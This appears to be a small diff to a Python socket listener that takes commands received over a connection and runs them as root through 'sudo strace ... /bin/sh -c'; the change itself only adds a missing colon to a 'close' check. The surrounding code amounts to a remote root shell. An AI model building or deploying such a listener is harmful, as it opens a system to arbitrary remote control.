@@ -38,7 +38,7 @@ while True:
   while True:
       cmd = c.recv(1024).decode("utf-8").strip()
       inputcmd = ["sudo","strace","-o","/dev/null","/bin/sh","-c", cmd]
-      if cmd == "close"
+      if cmd == "close":
         c.send("Closing connection")
         break
 
